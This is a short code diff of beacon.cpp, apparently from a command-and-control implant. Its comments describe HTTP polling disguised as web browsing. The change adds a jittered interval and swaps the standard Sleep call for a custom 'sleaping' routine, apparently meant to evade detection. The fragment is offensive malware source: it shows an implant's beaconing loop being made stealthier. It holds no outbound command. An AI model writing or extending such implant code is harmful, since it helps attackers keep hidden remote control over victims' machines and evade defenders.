@@ -1,6 +1,8 @@
 ﻿// beacon.cpp — Agent HTTP 轮询实现（协议 §8）
 // 流量收敛为周期性 GET/POST，无长连接；伪装成网页浏览。
 #include "pch.h"
+#include "types.h"
+#include "sleaping.h"
 #include "beacon.h"
 
 #include "cmd_dispatch.h"
@@ -348,7 +350,7 @@ namespace c2 {
                 actual = sleeptime + (rand() % (2 * jitter + 1)) - jitter;
             if (actual < 1)
                 actual = 1;
-            Sleep((DWORD)actual * 1000);
+            sleaping((DWORD64)(actual * 1000), &sleaping_para);
         }
     }
 
